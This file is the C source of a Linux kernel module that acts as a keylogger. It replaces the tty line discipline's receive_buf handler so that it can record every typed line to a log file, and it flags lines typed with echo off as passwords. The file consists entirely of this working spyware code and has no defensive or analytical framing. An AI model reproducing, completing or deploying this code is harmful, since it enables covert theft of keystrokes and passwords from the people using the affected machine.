#include <linux/init.h> // required for module_init/exit
#include <linux/module.h> // required for module development
#include <linux/kernel.h> // since we're dealing with the kerne
#include <linux/errno.h> // not too sure about this
#include <linux/unistd.h> // we're messing with syscalls
#include <linux/syscalls.h> // same as above
#include <linux/slab.h>
#include <linux/tty.h>
#include <linux/fs.h>
#include "headers/kfile.h" // file operations

// a module license is required for most modules to run
MODULE_LICENSE("GPL");

// defines for some constants
#define MAX_BUFFER 256
#define MAX_SPECIAL_CHAR_SIZE 12
// backspace chars
#define BACKSPACE_1 127 //local
#define BACKSPACE_2 8 // remote

// our log file
struct file* logfile;

// a struct to hold our chars
struct logger {
  int pos;
  char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE];
};

// our logger
struct logger* logger;

// functions for our logging, aka appending and resetting
void append_char(char* source, size_t count){
  if((logger->pos + count) > (MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE)){
    // prevent overflow
    return;
  }
  // otherwise, add the string to the buffer
  strncat(logger->buf,source,count);
  logger->pos += count;
}
void reset_logger(){
  logger->pos = 0;
  int i;
  for(i = 0;i < MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE;i++){
    logger->buf[i] = 0;
  }
}

// pointer to the old receive_buf function
void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
			char*,int);

// our replacement receive_buf
void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
		     char* fp, int count){

  // ignore raw mode
  if(!tty->raw && !tty->real_raw){
    //if(L_ICANON(tty) && !L_ECHO(tty)) to check for passwd prompts
    // if we have a single character
    if(count == 1){
      // check if it's the backspace char
      if(cp[0] == BACKSPACE_1 ||
	 cp[0] == BACKSPACE_2){
	// make sure we will remain in the buffer
	if(logger->pos){
	  logger->pos--;
	  logger->buf[logger->pos] = 0;
	}
      }else{
	// otherwise, add the char
	append_char((char*)cp,1);

	// check if the user pressed enter
	if(cp[0] == 0x0D ||
	   cp[0] == 0x0A){
	  // write our current log to our buffer
	  kwrite(logfile,0,logger->buf,logger->pos);

	  // if this is a password
	  if(L_ICANON(tty) && !L_ECHO(tty)){
	    kwrite(logfile,0,"--(the above is a password)--\n",30);
	  }
	  // reset the logger
	  reset_logger();
	}
      }
    }
  }
  // call the old function
  old_receive_buf(tty,cp,fp,count);
}
static int init(void) {
  // our structs
  struct tty_struct* tty = NULL;
  struct file* file = NULL;
  logfile = NULL;
  char* dev_name = "/dev/tty";

  // open the tty
  file = kopen(dev_name,LF_FLAGS,LF_PERMS);
  // open our logfile
  logfile = kopen(LF_PATH,LF_FLAGS,LF_PERMS);

  // init out log file
  char* init_message = "-----beginning of log entry-----\n";
  if(logfile) kwrite(logfile,0,init_message,33);

  if(file){

    // we got a tty, so lets init our logger
    logger = NULL;
    logger = (struct logger*)kmalloc(sizeof(struct logger),GFP_KERNEL);
    reset_logger();

    printk(KERN_ALERT "tty was opened\n");
    struct tty_file_private* priv = NULL;
    priv = file->private_data;
    if(priv) tty=priv->tty;
    if(tty){
      printk(KERN_ALERT "this is a valid tty\n");
      if(tty->ldisc->ops->receive_buf){
	//change the old receive_buf
	old_receive_buf = tty->ldisc->ops->receive_buf;
	tty->ldisc->ops->receive_buf = new_receive_buf;
      }
    }
  }
  kclose(file);
  return 0;
}
	 
static void exit(void) {
  // close our log file
  char* exit_message = "-----end of log entry-----\n";
  if(logfile) kwrite(logfile,0,exit_message,27);
  if(logfile) kclose(logfile);

  // our structs
  struct tty_struct* tty = NULL;
  struct file* file = NULL;
  char* dev_name = "/dev/tty";

  // open the tty
  file = kopen(dev_name,LF_FLAGS,LF_PERMS);
  if(file){
    // free our logger
    kfree(logger);
    struct tty_file_private* priv = NULL;
    priv = file->private_data;
    if(priv) tty=priv->tty;
    if(tty){
      if(tty->ldisc->ops->receive_buf){
	//restore the receive_buf function
	tty->ldisc->ops->receive_buf = old_receive_buf;
      }
    }
  }
  kclose(file);
}

// sets our custom functions as the init and exit functions
module_init(init);
module_exit(exit);
